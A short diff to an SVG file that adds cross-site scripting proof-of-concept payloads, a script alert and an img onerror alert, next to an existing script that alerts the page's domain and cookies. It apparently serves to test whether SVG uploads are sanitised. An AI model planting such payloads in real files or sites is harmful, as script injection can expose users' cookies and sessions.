@@ -6,4 +6,6 @@
    <script type="text/javascript">
       alert('XSS\n'+document.domain+'\n'+document.cookie);
    </script>
+   <script>alert(1)</script>
+   <img src=1 onerror=alert(1)>
 </svg>
